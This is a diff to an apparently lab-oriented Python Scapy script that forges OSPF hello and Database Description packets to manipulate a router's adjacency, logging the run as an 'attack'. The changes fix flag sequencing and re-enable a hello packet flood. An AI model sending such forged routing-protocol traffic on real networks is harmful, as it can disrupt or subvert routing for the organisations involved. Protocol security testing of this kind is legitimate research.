@@ -18,6 +18,7 @@ load_contrib("ospf")
 
 SOURCE_ADDRESS = '10.0.1.3'
 DESTINATION_ADDRESS = '10.0.1.2'
+HELLO_DESTINATION_MAC_ADDRESS = '01:00:5e:00:00:05'
 HELLO_DESTINATION_ADDRESS = '224.0.0.5'
 
 HELLO_INTERVAL = 10
@@ -71,25 +72,28 @@ def send_empty_dbd_messages(iface, srcMAC, dstMAC, srcIP, dstIP, n, interval):
 		src='2.2.2.3',\
 		type=2)
 
-	ospf_payload = OSPF_DBDesc(\
-		dbdescr=7L,\
-		options=2L) 
-		# 7L = I, M, MS => Init, More, Master
-		# 2L = E => External Routing
+	ospf_payload = OSPF_DBDesc(options=2L) # 2L = E => External Routing
 
 	frame = eth_header/ip_header/ospf_header/ospf_payload
 	frame.show()
 
 	for i in xrange(0, n):
-		log('sending %d-th dbd message with seqNum %d' % (i+1, seqNum + i), 'red')
+		log('sending dbd message %d with seqNum %d' % (i+1, seqNum + i), 'red')
 
 		sleep(interval)
 
 		frame.payload.payload.payload.ddseq = seqNum + i
+
+		if i == 0:
+			# 7L = I, M, MS => Init, More, Master
+			frame.payload.payload.payload.dbdescr = 7L
+		else:
+			# 1L = MS => Master
+			frame.payload.payload.payload.dbdescr = 1L
+
 		sendp(frame, iface=iface)
 
 
-"""
 def send_hello_packets(iface, srcMAC, dstMAC, srcIP, dstIP, interval):
 	eth_header = Ether(src=srcMAC, dst=dstMAC)
 
@@ -118,7 +122,6 @@ def send_hello_packets(iface, srcMAC, dstMAC, srcIP, dstIP, interval):
 		sleep(interval)
 
 		send_hello_packet(iface, srcMAC, dstMAC, srcIP, dstIP)
-"""
 
 
 def main():
@@ -143,14 +146,12 @@ def main():
 
 	# test2
 	# HELLO_DESTINATION_ADDRESS => TTL != 1 for a packet sent to the Local Network Control Block
-	send_hello_packet(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, HELLO_DESTINATION_ADDRESS)
+	send_hello_packet(iface, src_mac_address, HELLO_DESTINATION_MAC_ADDRESS, SOURCE_ADDRESS, HELLO_DESTINATION_ADDRESS)
 
-	# TODO
-	# R1 responds with updated HELLO
-	# check following messages
 	send_empty_dbd_messages(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS, 10, 2)
 
-	#send_hello_packets(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS, 39)
+	# TODO implement properly following messages
+	send_hello_packets(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS, 39)
 
 	log('attack terminated', 'red')
 
